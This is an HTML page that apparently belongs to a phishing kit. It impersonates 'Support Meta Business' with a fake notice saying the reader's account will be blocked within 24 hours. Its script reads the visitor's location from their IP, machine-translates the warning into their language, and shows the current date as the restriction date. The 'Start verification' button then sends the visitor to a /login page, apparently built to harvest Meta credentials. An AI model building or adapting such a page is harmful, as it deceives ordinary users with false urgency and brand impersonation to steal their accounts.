<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Support Meta Business</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }
    body { background-color: #F8F9FA; min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 16px; }
    .container { max-width: 620px; width: 100%; display: flex; flex-direction: column; gap: 16px; background-color: white; padding: 16px; border-radius: 8px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
    .hero-image { width: 100%; height: auto; border-radius: 4px; max-height: 250px; object-fit: cover; }
    .title { font-size: 24px; font-weight: bold; color: #212529; }
    .description { line-height: 24px; color: #212529; }
    .steps-container { position: relative; display: flex; flex-direction: column; gap: 16px; }
    .vertical-line { position: absolute; top: 50%; left: 12px; height: 70%; width: 2px; background-color: #E5E7EB; transform: translateY(-50%); z-index: 1; }
    .step { display: flex; align-items: center; gap: 8px; z-index: 2; }
    .step-icon { width: 28px; height: 28px; background-color: white; display: flex; align-items: center; justify-content: center; }
    .step-text { flex: 1; }
    .continue-btn { border-radius: 8px; background-color: #3B82F6; color: white; font-weight: bold; padding: 16px 12px; border: none; cursor: pointer; transition: opacity 0.2s; font-size: 16px; }
    .continue-btn:hover { opacity: 0.9; }
    .continue-btn:disabled { opacity: 0.5; cursor: not-allowed; }
    .restricted-text { text-align: center; }
    .date-bold { font-weight: bold; }
  </style>
</head>
<body>
  <div class="container" id="app">
    <img class="hero-image" src="hero.jpg" alt="Hero" />
    <p class="title" id="title">Your account will be blocked for 24 hours.</p>
    <p class="description" id="description">Our system detected unusual activity on your account which may violate image and posting rules.</p>

    <div class="steps-container">
      <div class="vertical-line"></div>
      <div class="step">
        <div class="step-icon">
          <i class="fas fa-circle-check" style="color: #9CA3AF; font-size: 28px;"></i>
        </div>
        <p class="step-text" id="step1">Please check and follow the indicated steps.</p>
      </div>
      <div class="step">
        <div class="step-icon">
          <i class="fas fa-id-card" style="color: #355797; font-size: 28px;"></i>
        </div>
        <p class="step-text" id="step2">To avoid account blocking, you have 24 hours left to verify and appeal.</p>
      </div>
    </div>

    <button class="continue-btn" id="continueBtn">Start verification</button>

    <p class="restricted-text" id="restrictedText">
      Your account was restricted on <span class="date-bold" id="currentDate">meta 2025</span>
    </p>
  </div>

  <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
  <script>
    const textsToTranslate = {
      title: 'Your account will be blocked for 24 hours.',
      description: 'Our system detected unusual activity on your account which may violate image and posting rules.',
      step1: 'Please check and follow the indicated steps.',
      step2: 'To avoid account blocking, you have 24 hours left to verify and appeal.',
      btn: 'Start verification',
      restricted: 'Your account was restricted on '
    };

    const countryToLanguage = {
      AT: 'de', BE: 'nl', JP: 'ja', BG: 'bg', BR: 'pt', CA: 'en', CY: 'el',
      CZ: 'cs', DE: 'de', DK: 'da', ES: 'es', FI: 'fi', FR: 'fr', GB: 'en',
      GR: 'el', HU: 'hu', IT: 'it', NL: 'nl', NO: 'no', PL: 'pl', PT: 'pt',
      RO: 'ro', SE: 'sv', TH: 'th', TR: 'tr', TW: 'zh', US: 'en', VN: 'vi'
    };

    async function detectLanguageByIP() {
      try {
        const resp = await fetch('https://get.geojs.io/v1/ip/geo.json');
        const data = await resp.json();
        if (data.country_code && countryToLanguage[data.country_code]) {
          return countryToLanguage[data.country_code];
        }
      } catch (e) {
        console.warn('GeoIP detection failed:', e);
      }
      return 'en'; // fallback
    }

    async function translateText(text, targetLang) {
      try {
        const res = await axios.get(
          `https://translate.googleapis.com/translate_a/single?client=gtx&sl=auto&tl=${targetLang}&dt=t&q=${encodeURIComponent(text)}`
        );
        return res.data[0][0][0];
      } catch (e) {
        console.warn('Translation failed:', text, e);
        return text;
      }
    }

    function formatDateForLocale(date, lang) {
      const LOCALE_MAP = { vi: 'vi-VN', en: 'en-US', fr: 'fr-FR', es: 'es-ES', ja: 'ja-JP' };
      const locale = LOCALE_MAP[lang] || 'en-US';
      return date.toLocaleDateString(locale, { day: 'numeric', month: 'long', year: 'numeric' });
    }

    async function applyTranslations(lang) {
      const translated = {};
      for (const key in textsToTranslate) {
        translated[key] = await translateText(textsToTranslate[key], lang);
      }

      document.getElementById('title').textContent = translated.title;
      document.getElementById('description').textContent = translated.description;
      document.getElementById('step1').textContent = translated.step1;
      document.getElementById('step2').textContent = translated.step2;
      document.getElementById('continueBtn').textContent = translated.btn;

      const formattedDate = formatDateForLocale(new Date(), lang);
      document.getElementById('restrictedText').innerHTML = `${translated.restricted} <span class="date-bold">${formattedDate}</span>`;
    }

    (async function init() {
      const lang = await detectLanguageByIP();
      await applyTranslations(lang);

      document.getElementById('continueBtn').addEventListener('click', function () {
        window.location.href = '/login'; // thay đổi nếu cần
      });
    })();
  </script>
</body>
</html>
